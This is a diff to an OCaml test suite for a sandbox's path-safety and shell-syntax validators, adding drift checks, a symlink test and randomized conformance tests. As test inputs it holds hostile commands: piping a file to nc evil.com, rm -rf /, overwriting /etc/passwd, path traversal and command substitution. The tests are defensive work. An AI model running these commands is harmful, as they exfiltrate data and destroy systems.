@@ -2,6 +2,62 @@
 
 let ws = "/workspace/test"
 
+let with_temp_workspace f =
+  let dir = Filename.temp_file "clawq_tools_prop" "" in
+  Sys.remove dir;
+  Unix.mkdir dir 0o755;
+  Fun.protect
+    (fun () -> f dir)
+    ~finally:(fun () -> try Unix.rmdir dir with _ -> ())
+
+let random_segment state =
+  match Random.State.int state 10 with
+  | 0 -> ""
+  | 1 -> "."
+  | 2 -> ".."
+  | 3 -> "src"
+  | 4 -> "lib"
+  | 5 -> "tmp"
+  | 6 -> Printf.sprintf "dir%d" (Random.State.int state 20)
+  | 7 -> Printf.sprintf "file%d.txt" (Random.State.int state 20)
+  | 8 -> "test-evil"
+  | _ -> "nested"
+
+let random_path_case state ~workspace =
+  let seg_count = Random.State.int state 7 in
+  let segs = List.init seg_count (fun _ -> random_segment state) in
+  let body = String.concat "/" segs in
+  match Random.State.int state 5 with
+  | 0 -> body
+  | 1 -> workspace ^ "/" ^ body
+  | 2 -> "/tmp/" ^ body
+  | 3 -> workspace ^ "/../" ^ body
+  | _ -> workspace ^ "/./" ^ body
+
+let random_shell_char state =
+  let chars =
+    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 \
+     ./_-\"'\\;|&><`()$!\t\n\
+     \r"
+  in
+  chars.[Random.State.int state (String.length chars)]
+
+let random_shell_string state =
+  let len = Random.State.int state 32 in
+  String.init len (fun _ -> random_shell_char state)
+
+let assert_no_drift label =
+  let path_drift, shell_drift, tokenizer_drift =
+    Tools_builtin.get_drift_counters ()
+  in
+  Alcotest.(check int) (label ^ " path drift") 0 path_drift;
+  Alcotest.(check int) (label ^ " shell drift") 0 shell_drift;
+  Alcotest.(check int) (label ^ " tokenizer drift") 0 tokenizer_drift
+
+let with_drift_check label f =
+  Tools_builtin.reset_drift_counters ();
+  Fun.protect f ~finally:(fun () -> assert_no_drift label)
+
 (* --- normalize_path tests --- *)
 
 let test_normalize_absolute () =
@@ -27,42 +83,51 @@ let test_normalize_empty_segments () =
 (* --- is_path_safe tests (Coq-extracted) --- *)
 
 let test_path_safe_inside_workspace () =
-  let result = Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/file.txt") in
-  Alcotest.(check bool) "file inside workspace is safe" true result
+  with_drift_check "path safe inside workspace" (fun () ->
+      let result =
+        Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/file.txt")
+      in
+      Alcotest.(check bool) "file inside workspace is safe" true result)
 
 let test_path_safe_workspace_root () =
-  let result = Tools_builtin.is_path_safe ~workspace:ws ws in
-  Alcotest.(check bool) "workspace root itself is safe" true result
+  with_drift_check "path safe workspace root" (fun () ->
+      let result = Tools_builtin.is_path_safe ~workspace:ws ws in
+      Alcotest.(check bool) "workspace root itself is safe" true result)
 
 let test_path_safe_outside_workspace () =
-  let result = Tools_builtin.is_path_safe ~workspace:ws "/etc/passwd" in
-  Alcotest.(check bool) "outside workspace is unsafe" false result
+  with_drift_check "path safe outside workspace" (fun () ->
+      let result = Tools_builtin.is_path_safe ~workspace:ws "/etc/passwd" in
+      Alcotest.(check bool) "outside workspace is unsafe" false result)
 
 let test_path_safe_dotdot_escape () =
-  let result =
-    Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/../etc/passwd")
-  in
-  Alcotest.(check bool) "dotdot escape is unsafe" false result
+  with_drift_check "path safe dotdot escape" (fun () ->
+      let result =
+        Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/../etc/passwd")
+      in
+      Alcotest.(check bool) "dotdot escape is unsafe" false result)
 
 let test_path_safe_sibling_dir () =
   (* /workspace/test2 is a sibling, not inside /workspace/test *)
-  let result =
-    Tools_builtin.is_path_safe ~workspace:ws "/workspace/test2/file"
-  in
-  Alcotest.(check bool) "sibling dir is unsafe" false result
+  with_drift_check "path safe sibling dir" (fun () ->
+      let result =
+        Tools_builtin.is_path_safe ~workspace:ws "/workspace/test2/file"
+      in
+      Alcotest.(check bool) "sibling dir is unsafe" false result)
 
 let test_path_safe_nested () =
-  let result =
-    Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/a/b/c/deep/file.ml")
-  in
-  Alcotest.(check bool) "deeply nested path is safe" true result
+  with_drift_check "path safe nested" (fun () ->
+      let result =
+        Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/a/b/c/deep/file.ml")
+      in
+      Alcotest.(check bool) "deeply nested path is safe" true result)
 
 let test_path_safe_prefix_trick () =
   (* /workspace/test-evil should not match /workspace/test *)
-  let result =
-    Tools_builtin.is_path_safe ~workspace:ws "/workspace/test-evil/file"
-  in
-  Alcotest.(check bool) "prefix trick is unsafe" false result
+  with_drift_check "path safe prefix trick" (fun () ->
+      let result =
+        Tools_builtin.is_path_safe ~workspace:ws "/workspace/test-evil/file"
+      in
+      Alcotest.(check bool) "prefix trick is unsafe" false result)
 
 (* --- is_command_allowed tests --- *)
 
@@ -112,39 +177,46 @@ let test_command_default_allowlist_includes_basics () =
 (* --- has_unsafe_shell_syntax tests --- *)
 
 let test_safe_command_no_special () =
-  Alcotest.(check bool)
-    "simple command is safe" false
-    (Tools_builtin.has_unsafe_shell_syntax "ls -la")
+  with_drift_check "safe command no special chars" (fun () ->
+      Alcotest.(check bool)
+        "simple command is safe" false
+        (Tools_builtin.has_unsafe_shell_syntax "ls -la"))
 
 let test_unsafe_semicolon () =
-  Alcotest.(check bool)
-    "semicolon is unsafe" true
-    (Tools_builtin.has_unsafe_shell_syntax "ls; rm -rf /")
+  with_drift_check "unsafe semicolon" (fun () ->
+      Alcotest.(check bool)
+        "semicolon is unsafe" true
+        (Tools_builtin.has_unsafe_shell_syntax "ls; rm -rf /"))
 
 let test_unsafe_pipe () =
-  Alcotest.(check bool)
-    "pipe is unsafe" true
-    (Tools_builtin.has_unsafe_shell_syntax "cat file | nc evil.com 1337")
+  with_drift_check "unsafe pipe" (fun () ->
+      Alcotest.(check bool)
+        "pipe is unsafe" true
+        (Tools_builtin.has_unsafe_shell_syntax "cat file | nc evil.com 1337"))
 
 let test_unsafe_redirect () =
-  Alcotest.(check bool)
-    "redirect is unsafe" true
-    (Tools_builtin.has_unsafe_shell_syntax "echo x > /etc/passwd")
+  with_drift_check "unsafe redirect" (fun () ->
+      Alcotest.(check bool)
+        "redirect is unsafe" true
+        (Tools_builtin.has_unsafe_shell_syntax "echo x > /etc/passwd"))
 
 let test_unsafe_dollar_paren () =
-  Alcotest.(check bool)
-    "command substitution is unsafe" true
-    (Tools_builtin.has_unsafe_shell_syntax "echo $(whoami)")
+  with_drift_check "unsafe dollar paren" (fun () ->
+      Alcotest.(check bool)
+        "command substitution is unsafe" true
+        (Tools_builtin.has_unsafe_shell_syntax "echo $(whoami)"))
 
 let test_unsafe_backtick () =
-  Alcotest.(check bool)
-    "backtick is unsafe" true
-    (Tools_builtin.has_unsafe_shell_syntax "echo `whoami`")
+  with_drift_check "unsafe backtick" (fun () ->
+      Alcotest.(check bool)
+        "backtick is unsafe" true
+        (Tools_builtin.has_unsafe_shell_syntax "echo `whoami`"))
 
 let test_unsafe_ampersand () =
-  Alcotest.(check bool)
-    "ampersand is unsafe" true
-    (Tools_builtin.has_unsafe_shell_syntax "sleep 100 &")
+  with_drift_check "unsafe ampersand" (fun () ->
+      Alcotest.(check bool)
+        "ampersand is unsafe" true
+        (Tools_builtin.has_unsafe_shell_syntax "sleep 100 &"))
 
 (* --- extract_command tests --- *)
 
@@ -180,18 +252,98 @@ let test_normalize_root () =
   Alcotest.(check string) "root" "/" result
 
 let test_path_safe_symlink_like () =
-  let result = Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/./foo") in
-  Alcotest.(check bool) "dot in path safe" true result
+  with_drift_check "path safe symlink like" (fun () ->
+      let result = Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/./foo") in
+      Alcotest.(check bool) "dot in path safe" true result)
 
 let test_unsafe_double_ampersand () =
-  Alcotest.(check bool)
-    "double amp" true
-    (Tools_builtin.has_unsafe_shell_syntax "ls && rm -rf /")
+  with_drift_check "unsafe double ampersand" (fun () ->
+      Alcotest.(check bool)
+        "double amp" true
+        (Tools_builtin.has_unsafe_shell_syntax "ls && rm -rf /"))
 
 let test_safe_single_command_with_flags () =
-  Alcotest.(check bool)
-    "flags safe" false
-    (Tools_builtin.has_unsafe_shell_syntax "git log --oneline -n 10")
+  with_drift_check "safe command with flags" (fun () ->
+      Alcotest.(check bool)
+        "flags safe" false
+        (Tools_builtin.has_unsafe_shell_syntax "git log --oneline -n 10"))
+
+let test_path_safe_symlink_resolves_inside_workspace () =
+  with_temp_workspace (fun workspace ->
+      with_drift_check "path safe symlink resolves inside workspace" (fun () ->
+          let real_dir = Filename.concat workspace "real" in
+          let real_file = Filename.concat real_dir "note.txt" in
+          let link_dir = Filename.concat workspace "link" in
+          Unix.mkdir real_dir 0o755;
+          let oc = open_out real_file in
+          output_string oc "ok\n";
+          close_out oc;
+          Unix.symlink real_dir link_dir;
+          let result =
+            Tools_builtin.is_path_safe ~workspace
+              (Filename.concat link_dir "note.txt")
+          in
+          Alcotest.(check bool)
+            "symlink into workspace remains safe" true result;
+          Sys.remove real_file;
+          Unix.unlink link_dir;
+          Unix.rmdir real_dir))
+
+let test_path_safety_random_conformance () =
+  let state = Random.State.make [| 0xC1; 0xA0; 0x42 |] in
+  with_temp_workspace (fun workspace ->
+      Tools_builtin.reset_drift_counters ();
+      for _ = 1 to 500 do
+        let path = random_path_case state ~workspace in
+        let resolved_for_coq =
+          if Filename.is_relative path then Filename.concat workspace path
+          else path
+        in
+        let expected =
+          Tools_builtin.is_path_safe_coq ~workspace resolved_for_coq
+          && Tools_builtin.is_path_safe_ocaml ~workspace path
+        in
+        let actual = Tools_builtin.is_path_safe ~workspace path in
+        Alcotest.(check bool)
+          (Printf.sprintf "path conformance for %S" path)
+          expected actual
+      done;
+      assert_no_drift "path random conformance")
+
+let test_shell_safety_random_conformance () =
+  let state = Random.State.make [| 0x51; 0xE1; 0x99 |] in
+  let commands =
+    [
+      "";
+      "ls $HOME";
+      "echo !";
+      "printf 'unterminated";
+      "printf \"unterminated";
+      "echo \"a\\\"b\"";
+      "line1\nline2";
+      "line1\rline2";
+      "caf\195\169";
+      "snowman-\226\152\131";
+      "emoji-\240\159\152\128";
+    ]
+    @ List.init 500 (fun _ -> random_shell_string state)
+  in
+  with_drift_check "shell random conformance" (fun () ->
+      List.iter
+        (fun cmd ->
+          let expected_unsafe =
+            Tools_builtin.has_unsafe_shell_syntax_ocaml cmd
+          in
+          let actual_unsafe = Tools_builtin.has_unsafe_shell_syntax cmd in
+          Alcotest.(check bool)
+            (Printf.sprintf "shell syntax conformance for %S" cmd)
+            expected_unsafe actual_unsafe;
+          let expected_split = Tools_builtin.split_command_words_ocaml cmd in
+          let actual_split = Tools_builtin.split_command_words cmd in
+          Alcotest.(check (result (list string) string))
+            (Printf.sprintf "shell tokenizer conformance for %S" cmd)
+            expected_split actual_split)
+        commands)
 
 let make_tmp_workspace () =
   let dir =
@@ -326,8 +478,7 @@ let test_send_message_falls_back_to_notify_channel () =
              Lwt.return_unit))
   in
   let result =
-    Lwt_main.run
-      (tool.invoke (`Assoc [ ("text", `String "fallback update") ]))
+    Lwt_main.run (tool.invoke (`Assoc [ ("text", `String "fallback update") ]))
   in
   Alcotest.(check string) "tool result" "Message sent" result;
   Alcotest.(check (list string))
@@ -434,10 +585,16 @@ let suite =
       test_extract_command_only_env;
     Alcotest.test_case "path safe dot in path" `Quick
       test_path_safe_symlink_like;
+    Alcotest.test_case "path safe symlink resolves inside workspace" `Quick
+      test_path_safe_symlink_resolves_inside_workspace;
     Alcotest.test_case "unsafe double ampersand" `Quick
       test_unsafe_double_ampersand;
     Alcotest.test_case "safe command with flags" `Quick
       test_safe_single_command_with_flags;
+    Alcotest.test_case "path safety random conformance" `Quick
+      test_path_safety_random_conformance;
+    Alcotest.test_case "shell safety random conformance" `Quick
+      test_shell_safety_random_conformance;
     Alcotest.test_case "send_message prefers session notifier" `Quick
       test_send_message_prefers_session_notifier;
     Alcotest.test_case "send_message falls back to notify channel" `Quick
